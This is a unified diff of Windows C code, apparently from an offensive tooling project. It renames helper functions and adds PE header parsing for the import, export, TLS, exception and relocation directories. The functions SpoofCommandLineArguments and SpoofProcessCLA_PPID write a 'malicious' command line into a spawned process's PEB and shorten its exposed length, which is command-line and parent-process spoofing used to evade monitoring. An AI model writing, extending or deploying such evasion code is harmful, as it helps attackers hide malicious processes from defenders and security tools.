@@ -746,14 +746,21 @@ UCHAR FetchImageHeaders
 							      hFile						 = 0;
 	NTSTATUS					  NtStatus					 = 0;
 	PPEB						  pProcessEnvironmentBlock_t = NULL;
-	PBYTE						  pImageData				 = NULL;
+	PBYTE						  pImageData_t				 = NULL;
 	PIMAGE_NT_HEADERS			  pImageNtHeaders			 = NULL;
 	PIMAGE_DOS_HEADER			  pImageDOSHeader			 = NULL;
 	fnNTQueryProcessInformation   NtQueryProcInfo		     = NULL;
 	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters     = NULL;
+	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir    = NULL;
+	PIMAGE_TLS_DIRECTORY 		  pImageTLSDirectory		 = NULL;
+	PIMAGE_SECTION_HEADER         pImageSectionHeader		 = NULL;
+	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRTFuncEntry_t		 = NULL;
+	PIMAGE_IMPORT_DESCRIPTOR      pImageImportDescriptor     = NULL;
+	PIMAGE_EXPORT_DIRECTORY 	  pImageExportDirectory_t    = NULL;
 	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t	 = { 0 };
 	IMAGE_FILE_HEADER			  ImageFileHeader_t			 = { 0 };
 	IMAGE_OPTIONAL_HEADER		  ImageOptionalHeader_t		 = { 0 };
+	IMAGE_DATA_DIRECTORY 		  ImageDataDirectory		 = { 0 };
 
 	if ((hHeap = GetProcessHeap()) == INVALID_HANDLE_VALUE) return 1;
 
@@ -763,40 +770,55 @@ UCHAR FetchImageHeaders
 
 	if((pProcessEnvironmentBlock_t = HeapAlloc(hHeap, 0, sizeof(PEB))) == NULL) return 3;
 
-	if (!ReadFromTargetProcess(hTargetProcess, ProcessBasicInfoBlock_t.PebBaseAddress, (PVOID*)&pProcessEnvironmentBlock_t, sizeof(PEB), hHeap)) return 4;
+	if (!ReadFromTargetProcessEnvironmentBlock(hTargetProcess, ProcessBasicInfoBlock_t.PebBaseAddress, (PVOID*)&pProcessEnvironmentBlock_t, sizeof(PEB), hHeap)) return 4;
 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		hTargetProcess, pProcessEnvironmentBlock_t->ProcessParameters,
-		&pProcessUserParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
+		(PVOID *) &pProcessUserParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
 		hHeap)) return 5;
 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		hTargetProcess, pProcessUserParameters->ImagePathName.Buffer,
-		&pProcessUserParameters->ImagePathName.Buffer, pProcessUserParameters->ImagePathName.Length,
+		(PVOID *)&pProcessUserParameters->ImagePathName.Buffer, pProcessUserParameters->ImagePathName.Length,
 		hHeap)) return 5;
 
-	if ((hFile = CreateFileW(pProcessUserParameters->ImagePathName.Buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE) return 6;
+	if ((hFile		= CreateFileW(pProcessUserParameters->ImagePathName.Buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE) return 6;
 
 	if ((dwFileSize = GetFileSize(hFile, NULL)) == 0) return 8;
 
-	if ((pImageData = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize)) == NULL) return 9;
+	if ((pImageData_t = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize)) == NULL) return 9;
 
-	if (ReadFile(hFile, pImageData, dwFileSize, &dwBytesRead, NULL) == FALSE || dwBytesRead != dwFileSize) return 10;
+	if (ReadFile(hFile, pImageData_t, dwFileSize, &dwBytesRead, NULL) == FALSE || dwBytesRead != dwFileSize) return 10;
 
-	pImageDOSHeader = (PIMAGE_DOS_HEADER)pImageData;
+	pImageDOSHeader			= (PIMAGE_DOS_HEADER)pImageData_t;
 
 	if (pImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) return 11;
 
-	pImageNtHeaders = (PIMAGE_NT_HEADERS)(pImageData + pImageDOSHeader->e_lfanew);
+	pImageNtHeaders			= (PIMAGE_NT_HEADERS)(pImageData_t + pImageDOSHeader->e_lfanew);
 
 	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) return 12;
 
-	ImageFileHeader_t = pImageNtHeaders->FileHeader;
+	ImageFileHeader_t		= pImageNtHeaders->FileHeader;
 
-	ImageOptionalHeader_t = pImageNtHeaders->OptionalHeader;
+	ImageOptionalHeader_t	= pImageNtHeaders->OptionalHeader;
 
 	if (ImageOptionalHeader_t.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) return 13;
 
+	pImageSectionHeader		= (PIMAGE_SECTION_HEADER)((PBYTE)pImageNtHeaders + sizeof(IMAGE_NT_HEADERS));
+
+	ImageDataDirectory		= ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+
+	pImageExportDirectory_t = (PIMAGE_EXPORT_DIRECTORY)(pImageData_t	   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	pImageImportDescriptor  = (PIMAGE_IMPORT_DESCRIPTOR)(pImageData_t	   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+	pImageTLSDirectory		= (PIMAGE_TLS_DIRECTORY)(pImageData_t		   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+
+	pImageRTFuncEntry_t     = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pImageData_t + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
+
+	pImageBaseRelocationDir = (PIMAGE_BASE_RELOCATION)(pImageData_t        + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+	getchar();
 	return 0;
 }
 
@@ -851,7 +873,7 @@ BOOLEAN SpoofCommandLineArguments
 
 	pProcEnvBlock_t = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess,
 		ProcessBasicInfoBlock_t.PebBaseAddress,
 		(PVOID *)&pProcEnvBlock_t,
@@ -859,17 +881,17 @@ BOOLEAN SpoofCommandLineArguments
 		hHeap
 	)) goto EndOfFunc;
 	 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters, 
 		&pProcessUserParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, 
 		hHeap )) goto EndOfFunc;
 
-	if (!WriteToTargetProcess(
+	if (!WriteToTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess,(PVOID)pProcessUserParameters->CommandLine.Buffer,
 		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
 	)) goto EndOfFunc;
 	
-	if (!WriteToTargetProcess(
+	if (!WriteToTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess, ((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)),
 		(PVOID)&dwExposedLength, sizeof(DWORD))) goto EndOfFunc;
 
@@ -880,6 +902,7 @@ BOOLEAN SpoofCommandLineArguments
 
 	if (!*pdwProcessId || !*phProcessHandle || !*pdwThreadId || !*phThreadHandle) return FALSE;
 	bState = TRUE;
+
 
 EndOfFunc:
 	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);
@@ -947,7 +970,7 @@ EndOfFunc:
 	return bState;
 }
 
-BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process IDentifier
+BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process Identifier
 (
 	IN	    LPWSTR  pSpoofedCommandLine,
 	IN      HANDLE  hSpoofedParentProcessHandle,
@@ -1031,24 +1054,24 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	pProcEnvBlock_t = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress,
 		(PVOID*)&pProcEnvBlock_t,sizeof(PEB),
 		hHeap
 	)) goto EndOfFunc;
 
-	if (!ReadFromTargetProcess(
+	if (!ReadFromTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, 
 		(PVOID *)&pProcessUserParameters,sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
 		hHeap
 	)) goto EndOfFunc;
 
-	if (!WriteToTargetProcess(
+	if (!WriteToTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess, (PVOID)pProcessUserParameters->CommandLine.Buffer,
 		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
 	)) goto EndOfFunc;
 
-	if (!WriteToTargetProcess(
+	if (!WriteToTargetProcessEnvironmentBlock(
 		ProcessInformation_t.hProcess,
 		((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)),
 		(PVOID)&dwNewLen,
@@ -1074,7 +1097,7 @@ EndOfFunc:
 	return bState;
 	}
 
-BOOLEAN ReadFromTargetProcess
+BOOLEAN ReadFromTargetProcessEnvironmentBlock
 (
 	IN     HANDLE hTargetProcess, 
 	IN     PVOID  pPEBBaseAddress, 
@@ -1099,7 +1122,7 @@ BOOLEAN ReadFromTargetProcess
 	return TRUE;
 }
 
-BOOLEAN WriteToTargetProcess
+BOOLEAN WriteToTargetProcessEnvironmentBlock
 (
 	IN      HANDLE hProcess,
 	IN      PVOID  pAddressToWriteTo,
